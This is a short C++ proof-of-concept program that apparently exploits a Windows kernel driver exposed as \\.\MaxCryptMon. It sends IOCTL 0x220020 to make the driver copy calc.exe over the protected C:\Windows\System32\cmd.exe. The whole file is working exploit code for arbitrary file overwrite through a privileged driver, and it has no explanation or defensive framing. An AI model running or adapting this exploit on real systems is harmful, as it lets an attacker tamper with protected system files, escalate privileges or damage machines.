#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\MaxCryptMon"

HANDLE hDevice;

struct DATA_220020
{
    WCHAR SourceFilePath[260];
    WCHAR DestinationFilePath[260];
};

void CopyFile_220020()
{
    DWORD dwWrite;
    DATA_220020 data;
    memset(data.SourceFilePath, 0, 520);
    memset(data.DestinationFilePath, 0, 520);

    WCHAR SourceFilePath[260] = L"\\??\\C:\\Windows\\System32\\calc.exe\0";
    WCHAR DestinationFilePath[260] = L"\\??\\C:\\Windows\\System32\\cmd.exe\0";
    memcpy(data.SourceFilePath, SourceFilePath, 520);
    memcpy(data.DestinationFilePath, DestinationFilePath, 520);
    DeviceIoControl(hDevice, 0x220020, &data, sizeof(data), NULL, 0, &dwWrite, NULL);
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    CopyFile_220020();

    system("pause");
    return 0;
}
